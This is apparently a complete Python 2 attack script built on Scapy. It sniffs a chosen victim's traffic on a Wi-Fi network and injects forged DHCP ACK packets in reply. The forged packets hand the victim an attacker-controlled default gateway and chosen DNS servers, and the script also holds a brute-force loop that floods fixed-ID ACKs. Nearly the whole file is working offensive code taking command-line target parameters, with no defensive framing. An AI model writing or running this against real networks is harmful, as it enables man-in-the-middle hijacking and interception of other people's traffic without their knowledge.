#!/usr/bin/python
# script to inject fake dhcp ack packets
import sys

if len(sys.argv) < 11:
    print 'Usage : ./injection.py interface bssid channel routermac dhcpIp victimMac victimIp fakerouterIP subnetMask broadcast'
    sys.exit()

import os
from scapy.all import *

# interface to send and receive 
conf.iface = sys.argv[1]
# parameters required to create a successful packet
bssid = sys.argv[2]
channel =  int(sys.argv[3])
routerMac = sys.argv[4]
dhcpIP = sys.argv[5]
victimMac = sys.argv[6]
victimIP = sys.argv[7]
fakerouterIP = sys.argv[8]
subnet = sys.argv[9]
broadcast = sys.argv[10]

# bpf filter used for sniffing qos-data packets sent by victim
filter = ' wlan addr2 ' + victimMac  + 'and type data subtype qos-data'

# using L2sockets as they are fast to implement
sock = conf.L2socket(iface =conf.iface)

# data rate at which packets will be sent
drate = 58.5
# random sequence number to be used 
sc = 25

# setting the right channel to send packet
os.system('iwconfig ' + conf.iface + ' channel ' + str(channel))

# channel to frequency converter
def get_frequency(channel):
    if channel == 14:
        freq = 2484
    else:
        freq = 2407 + (channel * 5)

    freq_string = struct.pack("<h", freq)

    return freq_string

# this function returns radiotap header which contains channel frequency and data rate info
def get_radiotap_header(drate,ch):
    radiotap_packet = RadioTap(len=18, present='Flags+Rate+Channel+dBm_AntSignal+Antenna', notdecoded='\x00' + struct.pack("<h",drate*2)[0] + get_frequency(ch) + '\xc0\x00\xc0\x01\x00\x00')
    return radiotap_packet

# converts a mac address string into hexadecimal equivalent
def mac_to_bytes(mac):
    return ''.join(chr(int(x, 16)) for x in mac.split(':'))

# This function takes care of sequence number in Dot11 packet
def next_sc():
    global sc
    sc = (sc + 1) % 4096
    return sc * 16  # Fragment number -> right 4 bits

ackpkt = get_radiotap_header(drate,channel) \
        / Dot11(subtype=8,type=2,addr1=victimMac,addr2=bssid,addr3=routerMac,SC=next_sc()) \
        / Dot11QoS() \
        / LLC() \
        / SNAP(OUI=0,code=2048) \
        / IP(src=dhcpIP,dst=victimIP) \
        / UDP(sport=67,dport=68)

# drafting the DHCP ack packet 
def ACKpkt1(xid):
    pkt = get_radiotap_header(drate,channel) \
         / Dot11(subtype=8,type=2,addr1=victimMac,addr2=bssid,addr3=routerMac,SC=next_sc()) \
         / Dot11QoS() \
         / LLC() \
         / SNAP(OUI=0,code=2048) \
         / IP(src=dhcpIP,dst=victimIP) \
         / UDP(sport=67,dport=68) \
         / BOOTP(op=2,htype=1,xid=xid,ciaddr='0.0.0.0',yiaddr=victimIP,siaddr='0.0.0.0',giaddr='0.0.0.0',chaddr=mac_to_bytes(victimMac),options='c\x82Sc') \
         / DHCP(options=[('message-type', 5), ('server_id',dhcpIP), ('lease_time', 32400), ('router', fakerouterIP), ('name_server', '4.2.2.2', '4.2.2.3'), ('subnet_mask', subnet), 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'end', 'pad', 'pad', 'pad', 'pad'])

    return pkt

# this function sends multiple ACKpkt packets 
def sendacks(xid):
    pkt  = ackpkt / BOOTP(op=2,htype=1,xid=xid,ciaddr='0.0.0.0',yiaddr=victimIP,siaddr='0.0.0.0',giaddr='0.0.0.0',chaddr=mac_to_bytes(victimMac),options='c\x82Sc') \
               / DHCP(options=[('message-type', 5), ('server_id',dhcpIP), ('lease_time', 32400), ('router', fakerouterIP), ('name_server', '4.2.2.2', '4.2.2.3'), ('subnet_mask', subnet), 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'end', 'pad', 'pad', 'pad', 'pad'])
    
    sock.send(pkt)
    sock.send(pkt)
    sock.send(pkt)
    #sock.send(ACKpkt)
    pass

def bruteForce():
    while 1:
        p = ackpkt \
              / BOOTP(op=2,htype=1,xid=123456789,ciaddr='0.0.0.0',yiaddr=victimIP,siaddr='0.0.0.0',giaddr='0.0.0.0',chaddr=mac_to_bytes(victimMac),options='c\x82Sc') \
              / DHCP(options=[('message-type', 5), ('server_id',dhcpIP), ('lease_time', 32400), ('router', fakerouterIP), ('name_server', '4.2.2.2', '4.2.2.3'), ('subnet_mask', subnet), 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'end', 'pad', 'pad', 'pad', 'pad'])
                
        sock.send(p)
        sock.send(p)
        #print(repr(p))
    pass

# callback function to handle all packets
def cb(pkt):
    # checking for data packets and particularly BOOTP messages
    if  pkt.haslayer(BOOTP):
        
        #if pkt[BOOTP].op == 1:  
        #xid = int(''.join([hex(pkt.xid)[2:][i:i+2] for i in [0,2,4,6]][::-1]),16)
        #xid = pkt.xid
        p = ackpkt \
              / BOOTP(op=2,htype=1,xid=pkt.xid,ciaddr='0.0.0.0',yiaddr=victimIP,siaddr='0.0.0.0',giaddr='0.0.0.0',chaddr=mac_to_bytes(victimMac),options='c\x82Sc') \
              / DHCP(options=[('message-type', 5), ('server_id',dhcpIP), ('lease_time', 32400), ('router', fakerouterIP), ('name_server', '4.2.2.2', '4.2.2.3'), ('subnet_mask', subnet), 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'pad', 'end', 'pad', 'pad', 'pad', 'pad'])
                
        sock.send(p)
        sock.send(p)
        #print(repr(p))
 
#bruteForce()

try:
    sniff(count=10000000,prn=cb,filter=filter)
except KeyboardInterrupt:
    sys.exit()